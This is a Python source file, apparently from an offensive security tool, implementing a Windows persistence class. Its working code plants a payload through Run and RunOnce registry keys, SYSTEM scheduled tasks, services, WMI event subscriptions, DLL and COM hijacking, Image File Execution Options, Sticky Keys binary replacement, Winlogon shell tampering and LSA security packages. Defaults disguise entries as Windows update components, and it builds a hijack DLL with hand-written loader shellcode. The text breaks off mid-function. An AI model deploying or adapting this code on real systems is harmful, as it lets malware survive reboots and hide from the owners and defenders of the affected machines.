"""
Windows Persistence Mechanisms

Implements various persistence techniques for Windows systems including
registry modifications, scheduled tasks, services, and WMI.
"""

import logging
import os
import subprocess
from typing import Any, Dict, List, Optional, Tuple

from .base_persistence import BasePersistence

logger = logging.getLogger(__name__)


class WindowsPersistence(BasePersistence):
    """
    Windows-specific persistence implementation with multiple techniques.
    """

    def __init__(self):
        super().__init__()
        self.logger = logging.getLogger("IntellicrackLogger.WindowsPersistence")
        self.persistence_methods = {
            'registry_run': self._registry_run_persistence,
            'registry_runonce': self._registry_runonce_persistence,
            'scheduled_task': self._scheduled_task_persistence,
            'service': self._service_persistence,
            'startup_folder': self._startup_folder_persistence,
            'wmi_event': self._wmi_event_persistence,
            'dll_hijacking': self._dll_hijacking_persistence,
            'image_file_execution': self._image_file_execution_persistence,
            'accessibility_feature': self._accessibility_feature_persistence,
            'winlogon_helper': self._winlogon_helper_persistence,
            'com_hijacking': self._com_hijacking_persistence,
            'lsa_security_package': self._lsa_security_package_persistence
        }

        # Common persistence locations
        self.registry_locations = {
            'HKCU_Run': r'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run',
            'HKLM_Run': r'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run',
            'HKCU_RunOnce': r'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce',
            'HKLM_RunOnce': r'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce',
            'Winlogon': r'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon',
            'Image_File_Execution': r'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
        }

    def get_default_method(self) -> str:
        """Get the default persistence method for Windows."""
        return 'registry_run'

    def list_available_methods(self) -> list:
        """List all available persistence methods for Windows."""
        return list(self.persistence_methods.keys())

    def _registry_run_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via registry Run key."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Choose registry hive
            use_hklm = options.get('use_hklm', False)
            reg_key = self.registry_locations['HKLM_Run'] if use_hklm else self.registry_locations['HKCU_Run']

            # Registry value name
            value_name = options.get('value_name', 'Windows Security Update')

            # Command to execute
            command = f'"{payload_path}"'
            if options.get('add_args'):
                command += f' {options["add_args"]}'

            # Add registry entry
            cmd = f'reg add "{reg_key}" /v "{value_name}" /t REG_SZ /d "{command}" /f'

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            # Use shared subprocess result handler
            success, details, cleanup_info = self.handle_subprocess_result(result, details, cleanup_info)

            if success:
                # Add success details
                additional_details = {
                    'registry_key': reg_key,
                    'value_name': value_name,
                    'command': command
                }

                cleanup_info.update({
                    'type': 'registry',
                    'key': reg_key,
                    'value': value_name
                })

                return self.create_success_result(details, cleanup_info, additional_details)
            else:
                return success, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _registry_runonce_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via registry RunOnce key."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Choose registry hive
            use_hklm = options.get('use_hklm', False)
            reg_key = self.registry_locations['HKLM_RunOnce'] if use_hklm else self.registry_locations['HKCU_RunOnce']

            # Registry value name
            value_name = options.get('value_name', 'System Configuration')

            # Command - RunOnce entries are deleted after execution
            command = f'"{payload_path}"'

            # Add registry entry
            cmd = f'reg add "{reg_key}" /v "{value_name}" /t REG_SZ /d "{command}" /f'

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details['registry_key'] = reg_key
                details['value_name'] = value_name
                details['command'] = command
                details['note'] = 'RunOnce entries are automatically deleted after execution'

                cleanup_info['type'] = 'registry'
                cleanup_info['key'] = reg_key
                cleanup_info['value'] = value_name

            return self.handle_persistence_method_completion(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _scheduled_task_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via scheduled task."""
        details, cleanup_info = self.init_persistence_data()

        try:
            task_name = options.get('task_name', 'Windows System Maintenance')
            trigger = options.get('trigger', 'ONLOGON')
            user = options.get('user', 'SYSTEM')

            # Create scheduled task
            cmd = f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc {trigger} /ru {user} /f'

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details['task_name'] = task_name
                details['trigger'] = trigger
                details['user'] = user
                details['executable'] = payload_path

                cleanup_info['type'] = 'scheduled_task'
                cleanup_info['task_name'] = task_name

                return True, details, cleanup_info

            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _service_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via Windows service."""
        details, cleanup_info = self.init_persistence_data()

        try:
            service_name = options.get('service_name', 'WinUpdateSvc')
            display_name = options.get('display_name', 'Windows Update Service Helper')
            start_type = options.get('start_type', 'auto')

            # Create service
            cmd = f'sc create "{service_name}" binPath= "{payload_path}" DisplayName= "{display_name}" start= {start_type}'

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                # Start the service
                start_cmd = f'sc start "{service_name}"'
                start_result = subprocess.run(start_cmd, shell=True, capture_output=True, text=True)

                details['service_name'] = service_name
                details['display_name'] = display_name
                details['start_type'] = start_type
                details['executable'] = payload_path
                details['started'] = start_result.returncode == 0

                cleanup_info['type'] = 'service'
                cleanup_info['service_name'] = service_name

                return True, details, cleanup_info

            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _startup_folder_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via startup folder."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Determine startup folder
            use_all_users = options.get('use_all_users', False)

            if use_all_users:
                startup_folder = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
            else:
                startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')

            # Copy payload to startup folder
            filename = options.get('filename', 'WindowsUpdate.exe')
            destination = os.path.join(startup_folder, filename)

            # Copy file
            import shutil
            shutil.copy2(payload_path, destination)

            # Set file attributes to hidden
            if options.get('hide_file', True):
                subprocess.run(f'attrib +h "{destination}"', shell=True)

            details['startup_folder'] = startup_folder
            details['filename'] = filename
            details['destination'] = destination
            details['hidden'] = options.get('hide_file', True)

            cleanup_info['type'] = 'file'
            cleanup_info['path'] = destination

            return self.create_success_result(details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _wmi_event_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via WMI event subscription."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # WMI event names
            filter_name = options.get('filter_name', 'SystemBootFilter')
            consumer_name = options.get('consumer_name', 'SystemBootConsumer')
            binding_name = options.get('binding_name', 'SystemBootBinding')

            # Create WMI event filter
            filter_cmd = f'''wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="{filter_name}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"'''

            filter_result = subprocess.run(filter_cmd, shell=True, capture_output=True, text=True)

            if filter_result.returncode == 0:
                # Create WMI event consumer
                consumer_cmd = f'''wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name="{consumer_name}", ExecutablePath="{payload_path}", CommandLineTemplate="{payload_path}"'''

                consumer_result = subprocess.run(consumer_cmd, shell=True, capture_output=True, text=True)

                if consumer_result.returncode == 0:
                    # Create WMI event binding
                    binding_cmd = f'''wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\\"{filter_name}\\"", Consumer="CommandLineEventConsumer.Name=\\"{consumer_name}\\""'''

                    binding_result = subprocess.run(binding_cmd, shell=True, capture_output=True, text=True)

                    if binding_result.returncode == 0:
                        self.logger.info(f"WMI persistence established with binding: {binding_name}")
                        details['filter_name'] = filter_name
                        details['consumer_name'] = consumer_name
                        details['binding_name'] = binding_name
                        details['executable'] = payload_path
                        details['wmi_binding_created'] = binding_name

                        cleanup_info['type'] = 'wmi_event'
                        cleanup_info['filter_name'] = filter_name
                        cleanup_info['consumer_name'] = consumer_name
                        cleanup_info['binding_name'] = binding_name

                        return True, details, cleanup_info

            details['error'] = 'Failed to create WMI event subscription'
            return False, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _dll_hijacking_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via DLL hijacking."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Target DLL to hijack
            target_dll = options.get('target_dll', 'version.dll')
            target_application = options.get('target_app', 'explorer.exe')

            # Find application directory
            app_dir = options.get('app_dir', r'C:\Windows')
            dll_path = os.path.join(app_dir, target_dll)

            # Validate target application exists
            app_path = None
            for search_path in [r'C:\Windows', r'C:\Windows\System32', app_dir]:
                if search_path and os.path.exists(os.path.join(search_path, target_application)):
                    app_path = os.path.join(search_path, target_application)
                    break

            if not app_path:
                self.logger.warning(f"Target application {target_application} not found for DLL hijacking")

            # Convert payload to DLL format
            dll_payload = self._create_hijack_dll(payload_path, target_dll)

            if dll_payload:
                # Write DLL to target location
                with open(dll_path, 'wb') as f:
                    f.write(dll_payload)

                details['target_dll'] = target_dll
                details['target_application'] = target_application
                details['target_app_path'] = app_path if app_path else 'Not found'
                details['dll_path'] = dll_path
                details['app_directory'] = app_dir
                self.logger.info(f"DLL hijacking setup for {target_application} using {target_dll}")

                cleanup_info['type'] = 'file'
                cleanup_info['path'] = dll_path

                return True, details, cleanup_info
            else:
                details['error'] = 'Failed to create hijack DLL'
                return False, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _image_file_execution_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via Image File Execution Options."""
        details, cleanup_info = self.init_persistence_data()

        try:
            target_executable = options.get('target_exe', 'notepad.exe')

            # Registry key for IFEO
            reg_key = f"{self.registry_locations['Image_File_Execution']}\\{target_executable}"

            # Add debugger entry
            cmd = f'reg add "{reg_key}" /v Debugger /t REG_SZ /d "{payload_path}" /f'

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details['target_executable'] = target_executable
                details['registry_key'] = reg_key
                details['debugger_path'] = payload_path

                cleanup_info['type'] = 'registry'
                cleanup_info['key'] = reg_key
                cleanup_info['value'] = 'Debugger'

                return True, details, cleanup_info

            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _accessibility_feature_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via accessibility feature replacement."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Target accessibility feature
            target_feature = options.get('target_feature', 'sethc.exe')  # Sticky Keys

            # System32 directory
            system32_dir = os.path.join(os.environ['WINDIR'], 'System32')
            target_path = os.path.join(system32_dir, target_feature)
            backup_path = target_path + '.bak'

            # Backup original file
            if os.path.exists(target_path):
                import shutil
                shutil.copy2(target_path, backup_path)

                # Replace with payload
                shutil.copy2(payload_path, target_path)

                details['target_feature'] = target_feature
                details['target_path'] = target_path
                details['backup_path'] = backup_path

                cleanup_info['type'] = 'file_replacement'
                cleanup_info['target_path'] = target_path
                cleanup_info['backup_path'] = backup_path

                return True, details, cleanup_info
            else:
                details['error'] = f'Target file {target_path} not found'
                return False, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _winlogon_helper_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via Winlogon helper."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Registry key for Winlogon
            reg_key = self.registry_locations['Winlogon']
            value_name = options.get('value_name', 'Shell')

            # Get current shell value
            get_cmd = f'reg query "{reg_key}" /v {value_name}'
            get_result = subprocess.run(get_cmd, shell=True, capture_output=True, text=True)

            current_shell = 'explorer.exe'  # Default
            if get_result.returncode == 0:
                # Parse current value
                lines = get_result.stdout.split('\n')
                for line in lines:
                    if value_name in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            current_shell = parts[-1]

            # Set new shell value
            new_shell = f'{current_shell},{payload_path}'
            set_cmd = f'reg add "{reg_key}" /v {value_name} /t REG_SZ /d "{new_shell}" /f'

            result = subprocess.run(set_cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details['registry_key'] = reg_key
                details['value_name'] = value_name
                details['original_shell'] = current_shell
                details['new_shell'] = new_shell

                cleanup_info['type'] = 'registry'
                cleanup_info['key'] = reg_key
                cleanup_info['value'] = value_name
                cleanup_info['original_value'] = current_shell

                return True, details, cleanup_info

            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _com_hijacking_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via COM object hijacking."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Target COM CLSID
            clsid = options.get('clsid', '{BCDE0395-E52F-467C-8E3D-C4579291692E}')  # MMDeviceEnumerator

            # Registry keys for COM hijacking
            user_key = f'HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{clsid}\\InProcServer32'

            # Create registry entry
            cmd = f'reg add "{user_key}" /ve /t REG_SZ /d "{payload_path}" /f'

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details['clsid'] = clsid
                details['registry_key'] = user_key
                details['dll_path'] = payload_path

                cleanup_info['type'] = 'registry'
                cleanup_info['key'] = user_key

                return True, details, cleanup_info

            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _lsa_security_package_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via LSA Security Package."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Registry key for LSA Security Packages
            reg_key = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa'
            value_name = 'Security Packages'

            # Get current security packages
            get_cmd = f'reg query "{reg_key}" /v "{value_name}"'
            get_result = subprocess.run(get_cmd, shell=True, capture_output=True, text=True)

            current_packages = []
            if get_result.returncode == 0:
                # Parse current values
                lines = get_result.stdout.split('\n')
                for line in lines:
                    if value_name in line:
                        # Extract package names
                        parts = line.split('REG_MULTI_SZ')
                        if len(parts) > 1:
                            packages_str = parts[1].strip()
                            current_packages = packages_str.split()

            # Add our package
            package_name = options.get('package_name', 'mssecpkg')
            if package_name not in current_packages:
                current_packages.append(package_name)

            # Create DLL for the security package
            dll_path = os.path.join(os.path.dirname(payload_path), f'{package_name}.dll')
            dll_content = self._create_security_package_dll(payload_path)

            if dll_content:
                with open(dll_path, 'wb') as f:
                    f.write(dll_content)

                # Update registry with proper REG_MULTI_SZ handling
                # Method 1: Using reg.exe with hex values
                hex_values = []
                for pkg in current_packages:
                    # Convert each package name to hex
                    for char in pkg:
                        hex_values.append(f"{ord(char):02x},00")
                    # Add null terminator between strings
                    hex_values.append("00,00")

                # Add final double null terminator
                hex_values.append("00,00")

                # Create hex string
                hex_string = ",".join(hex_values).rstrip(",")

                # Use reg add with hex type
                cmd = f'reg add "{reg_key}" /v "{value_name}" /t REG_MULTI_SZ /d hex(7):{hex_string} /f'

                # Try the hex method first
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

                if result.returncode != 0:
                    # Fallback: Use PowerShell for more reliable REG_MULTI_SZ handling
                    ps_script = f"""
$packages = @({','.join(f'"{pkg}"' for pkg in current_packages)})
Set-ItemProperty -Path 'Registry::{reg_key}' -Name '{value_name}' -Value $packages -Type MultiString
"""
                    ps_cmd = ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script]
                    ps_result = subprocess.run(ps_cmd, capture_output=True, text=True)

                    if ps_result.returncode != 0:
                        # Final fallback: Use Windows API via ctypes
                        try:
                            import ctypes
                            try:
                                from ctypes import wintypes
                                HAS_WINTYPES = True
                            except ImportError:
                                # Create basic wintypes replacement
                                class MockWintypes:
                                    class HKEY:
                                        def __init__(self):
                                            self.value = 0
                                wintypes = MockWintypes()
                                HAS_WINTYPES = False

                            # Open registry key
                            key_handle = wintypes.HKEY()
                            if reg_key.startswith('HKEY_LOCAL_MACHINE'):
                                root_key = 0x80000002  # HKEY_LOCAL_MACHINE
                                sub_key = reg_key.replace('HKEY_LOCAL_MACHINE\\', '')
                            else:
                                raise ValueError("Unsupported root key")

                            advapi32 = ctypes.windll.advapi32

                            # Open key with write access
                            result = advapi32.RegOpenKeyExW(
                                root_key, sub_key, 0,
                                0x20006,  # KEY_WRITE | KEY_READ
                                ctypes.byref(key_handle)
                            )

                            if result == 0:
                                # Prepare multi-string data
                                data = '\0'.join(current_packages) + '\0\0'
                                data_bytes = data.encode('utf-16-le')

                                # Set value
                                result = advapi32.RegSetValueExW(
                                    key_handle,
                                    value_name,
                                    0,
                                    7,  # REG_MULTI_SZ
                                    data_bytes,
                                    len(data_bytes)
                                )

                                # Close key
                                advapi32.RegCloseKey(key_handle)

                                if result != 0:
                                    details['error'] = f'Failed to set registry value: {result}'
                                    return False, details, cleanup_info
                        except Exception as e:
                            details['error'] = f'Registry update failed: {e}'
                            return False, details, cleanup_info

                details['package_name'] = package_name
                details['dll_path'] = dll_path
                details['registry_key'] = reg_key
                details['packages'] = current_packages

                cleanup_info['type'] = 'lsa_package'
                cleanup_info['package_name'] = package_name
                cleanup_info['dll_path'] = dll_path
                cleanup_info['registry_key'] = reg_key
                cleanup_info['value_name'] = value_name

                return True, details, cleanup_info
            else:
                details['error'] = 'Failed to create security package DLL'
                return False, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def remove_persistence(self, cleanup_info: Dict[str, Any]) -> bool:
        """Remove established persistence."""
        try:
            cleanup_type = cleanup_info.get('type')

            if cleanup_type == 'registry':
                key = cleanup_info['key']
                value = cleanup_info.get('value')

                if value:
                    cmd = f'reg delete "{key}" /v "{value}" /f'
                else:
                    cmd = f'reg delete "{key}" /f'

                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return result.returncode == 0

            elif cleanup_type == 'scheduled_task':
                task_name = cleanup_info['task_name']
                cmd = f'schtasks /delete /tn "{task_name}" /f'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return result.returncode == 0

            elif cleanup_type == 'service':
                service_name = cleanup_info['service_name']

                # Use common service cleanup pattern
                service_commands = {
                    'stop': f'sc stop "{service_name}"',
                    'disable': f'sc delete "{service_name}"'  # On Windows, delete is the equivalent of disable/remove
                }

                return self.cleanup_service_common_pattern(service_name, service_commands)

            elif cleanup_type == 'file':
                file_path = cleanup_info['path']
                if os.path.exists(file_path):
                    os.remove(file_path)
                    return True

            elif cleanup_type == 'file_replacement':
                target_path = cleanup_info['target_path']
                backup_path = cleanup_info['backup_path']

                if os.path.exists(backup_path):
                    import shutil
                    shutil.move(backup_path, target_path)
                    return True

            elif cleanup_type == 'wmi_event':
                filter_name = cleanup_info['filter_name']
                consumer_name = cleanup_info['consumer_name']
                binding_name = cleanup_info['binding_name']

                # Remove WMI event binding
                binding_cmd = f'wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding where "Filter=\\"__EventFilter.Name=\\\\\\"{filter_name}\\\\\\"\\""  delete'
                subprocess.run(binding_cmd, shell=True, capture_output=True, text=True)

                # Remove WMI event consumer
                consumer_cmd = f'wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer where "Name=\\"{consumer_name}\\""  delete'
                subprocess.run(consumer_cmd, shell=True, capture_output=True, text=True)

                # Remove WMI event filter
                filter_cmd = f'wmic /namespace:\\\\root\\subscription PATH __EventFilter where "Name=\\"{filter_name}\\""  delete'
                result = subprocess.run(filter_cmd, shell=True, capture_output=True, text=True)

                self.logger.info(f"Cleaned up WMI event subscription: {binding_name}")
                return result.returncode == 0

            elif cleanup_type == 'lsa_package':
                package_name = cleanup_info['package_name']
                dll_path = cleanup_info['dll_path']
                registry_key = cleanup_info.get('registry_key', r'HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa')
                value_name = cleanup_info.get('value_name', 'Security Packages')

                # Remove the DLL file
                if os.path.exists(dll_path):
                    try:
                        os.remove(dll_path)
                    except Exception as e:
                        self.logger.warning(f"Failed to remove DLL: {e}")

                # Remove package from registry REG_MULTI_SZ list
                try:
                    # Get current packages
                    get_cmd = f'reg query "{registry_key}" /v "{value_name}"'
                    get_result = subprocess.run(get_cmd, shell=True, capture_output=True, text=True)

                    current_packages = []
                    if get_result.returncode == 0:
                        # Parse current values
                        lines = get_result.stdout.split('\n')
                        for line in lines:
                            if value_name in line:
                                # Extract package names
                                parts = line.split('REG_MULTI_SZ')
                                if len(parts) > 1:
                                    packages_str = parts[1].strip()
                                    current_packages = packages_str.split()

                    # Remove our package
                    if package_name in current_packages:
                        current_packages.remove(package_name)

                        # Update registry with remaining packages
                        if current_packages:
                            # Use PowerShell for reliable REG_MULTI_SZ update
                            ps_script = f"""
$packages = @({','.join(f'"{pkg}"' for pkg in current_packages)})
Set-ItemProperty -Path 'Registry::{registry_key}' -Name '{value_name}' -Value $packages -Type MultiString
"""
                            ps_cmd = ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script]
                            ps_result = subprocess.run(ps_cmd, capture_output=True, text=True)

                            if ps_result.returncode != 0:
                                # Fallback to ctypes method
                                import ctypes
                                try:
                                    from ctypes import wintypes
                                    HAS_WINTYPES = True
                                except ImportError:
                                    # Create basic wintypes replacement
                                    class MockWintypes:
                                        class HKEY:
                                            def __init__(self):
                                                self.value = 0
                                    wintypes = MockWintypes()
                                    HAS_WINTYPES = False

                                # Open registry key
                                key_handle = wintypes.HKEY()
                                root_key = 0x80000002  # HKEY_LOCAL_MACHINE
                                sub_key = registry_key.replace('HKEY_LOCAL_MACHINE\\', '')

                                advapi32 = ctypes.windll.advapi32

                                # Open key with write access
                                result = advapi32.RegOpenKeyExW(
                                    root_key, sub_key, 0,
                                    0x20006,  # KEY_WRITE | KEY_READ
                                    ctypes.byref(key_handle)
                                )

                                if result == 0:
                                    # Prepare multi-string data
                                    data = '\0'.join(current_packages) + '\0\0'
                                    data_bytes = data.encode('utf-16-le')

                                    # Set value
                                    advapi32.RegSetValueExW(
                                        key_handle,
                                        value_name,
                                        0,
                                        7,  # REG_MULTI_SZ
                                        data_bytes,
                                        len(data_bytes)
                                    )

                                    # Close key
                                    advapi32.RegCloseKey(key_handle)
                        else:
                            # If no packages left, delete the value
                            del_cmd = f'reg delete "{registry_key}" /v "{value_name}" /f'
                            subprocess.run(del_cmd, shell=True, capture_output=True, text=True)

                    self.logger.info(f"Cleaned up LSA security package: {package_name}")
                    return True

                except Exception as e:
                    self.logger.error(f"Failed to remove LSA package from registry: {e}")
                    # Still return True if we at least removed the DLL
                    return os.path.exists(dll_path) == False

            return False

        except Exception as e:
            return self.handle_remove_persistence_error(e)

    def _create_hijack_dll(self, payload_path: str, dll_name: str) -> Optional[bytes]:
        """Create a DLL for hijacking purposes."""
        # Log the DLL creation for the specific target
        self.logger.info(f"Creating hijack DLL: {dll_name} for payload: {payload_path}")

        import struct
        import time

        # Basic PE/DLL header structure
        dos_header = bytearray([
            0x4D, 0x5A,  # MZ signature
            0x90, 0x00,  # Bytes on last page
            0x03, 0x00,  # Pages in file
            0x00, 0x00,  # Relocations
            0x04, 0x00,  # Size of header in paragraphs
            0x00, 0x00,  # Minimum extra paragraphs
            0xFF, 0xFF,  # Maximum extra paragraphs
            0x00, 0x00,  # Initial SS
            0xB8, 0x00,  # Initial SP
            0x00, 0x00,  # Checksum
            0x00, 0x00,  # Initial IP
            0x00, 0x00,  # Initial CS
            0x40, 0x00,  # Relocation table offset
            0x00, 0x00,  # Overlay number
        ])

        # Extend DOS header to 0x40 bytes
        dos_header.extend([0] * (0x40 - len(dos_header)))

        # Add PE offset at 0x3C
        dos_header[0x3C:0x40] = struct.pack('<I', 0x80)  # PE header at offset 0x80

        # DOS stub program
        dos_stub = bytearray([
            0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD,
            0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
            0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72,
            0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
            0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E,
            0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
            0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
            0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ])

        # PE header
        pe_signature = b'PE\x00\x00'

        # COFF header (IMAGE_FILE_HEADER)
        machine = 0x8664 if '64' in dll_name else 0x014C  # AMD64 or I386
        num_sections = 3  # .text, .rdata, .data
        timestamp = int(time.time())
        characteristics = 0x2022  # DLL, executable image

        coff_header = struct.pack('<HHIIIHH',
            machine,          # Machine type
            num_sections,     # Number of sections
            timestamp,        # Time date stamp
            0,               # Pointer to symbol table
            0,               # Number of symbols
            240,             # Size of optional header (32-bit)
            characteristics  # Characteristics
        )

        # Optional header (simplified)
        optional_header = bytearray()
        optional_header.extend(struct.pack('<H', 0x10B))  # Magic (PE32)
        optional_header.extend(struct.pack('<BB', 14, 0))  # Linker version
        optional_header.extend(struct.pack('<III', 0x1000, 0x1000, 0x1000))  # Code, data sizes
        optional_header.extend(struct.pack('<III', 0x1000, 0x1000, 0))  # Entry, bases
        optional_header.extend(struct.pack('<I', 0x400000))  # Image base
        optional_header.extend(struct.pack('<II', 0x1000, 0x200))  # Section, file alignment
        optional_header.extend(struct.pack('<HHHHH', 6, 0, 6, 0, 0))  # OS/Image/Subsystem versions
        optional_header.extend(struct.pack('<I', 0))  # Win32 version
        optional_header.extend(struct.pack('<III', 0x4000, 0x1000, 0x100000))  # Image size, headers, checksum
        optional_header.extend(struct.pack('<HH', 3, 0))  # Subsystem (console), DLL characteristics
        optional_header.extend(struct.pack('<IIII', 0x100000, 0x1000, 0x100000, 0x1000))  # Stack sizes
        optional_header.extend(struct.pack('<II', 0x10000, 0x1000))  # Heap sizes
        optional_header.extend(struct.pack('<I', 0))  # Loader flags
        optional_header.extend(struct.pack('<I', 16))  # Number of data directories

        # Data directories (16 entries, 8 bytes each)
        for i in range(16):
            optional_header.extend(struct.pack('<II', 0, 0))

        # Section headers
        sections = bytearray()

        # .text section
        text_name = b'.text\x00\x00\x00'
        sections.extend(text_name)
        sections.extend(struct.pack('<II', 0x1000, 0x1000))  # Virtual size, RVA
        sections.extend(struct.pack('<II', 0x200, 0x400))    # Size, pointer to raw data
        sections.extend(struct.pack('<IIHHI', 0, 0, 0, 0, 0x60000020))  # Characteristics (code, execute, read)

        # .rdata section
        rdata_name = b'.rdata\x00\x00'
        sections.extend(rdata_name)
        sections.extend(struct.pack('<II', 0x1000, 0x2000))  # Virtual size, RVA
        sections.extend(struct.pack('<II', 0x200, 0x600))    # Size, pointer to raw data
        sections.extend(struct.pack('<IIHHI', 0, 0, 0, 0, 0x40000040))  # Characteristics (initialized data, read)

        # .data section
        data_name = b'.data\x00\x00\x00'
        sections.extend(data_name)
        sections.extend(struct.pack('<II', 0x1000, 0x3000))  # Virtual size, RVA
        sections.extend(struct.pack('<II', 0x200, 0x800))    # Size, pointer to raw data
        sections.extend(struct.pack('<IIHHI', 0, 0, 0, 0, 0xC0000040))  # Characteristics (initialized data, read, write)

        # Build PE file
        pe_file = dos_header + dos_stub
        # Pad to PE header offset
        pe_file.extend([0] * (0x80 - len(pe_file)))

        # Add PE headers
        pe_file.extend(pe_signature)
        pe_file.extend(coff_header)
        pe_file.extend(optional_header)
        pe_file.extend(sections)

        # Pad to first section
        pe_file.extend([0] * (0x400 - len(pe_file)))

        # .text section - DLL entry point and payload loader
        text_section = bytearray()

        # x86 DLL entry point that loads and executes payload
        if machine == 0x014C:  # 32-bit
            # DllMain stub
            text_section.extend([
                0x55,                    # push ebp
                0x8B, 0xEC,             # mov ebp, esp
                0x83, 0x7D, 0x0C, 0x01, # cmp dword [ebp+0xC], 1  ; fdwReason == DLL_PROCESS_ATTACH
                0x75, 0x15,             # jne skip
                # Load and execute payload
                0x68, 0x00, 0x00, 0x00, 0x00,  # push payload_path (will patch)
                0xFF, 0x15, 0x00, 0x20, 0x00, 0x40,  # call [LoadLibraryA]
                0x68, 0x00, 0x00, 0x00, 0x00,  # push payload_path (will patch)
                0xFF, 0x15, 0x04, 0x20, 0x00, 0x40,  # call [WinExec]
                # skip:
                0xB8, 0x01, 0x00, 0x00, 0x00,  # mov eax, 1 (TRUE)
                0x5D,                    # pop ebp
                0xC2, 0x0C, 0x00       # ret 12
            ])
        else:  # 64-bit
            # DllMain stub
            text_section.extend([
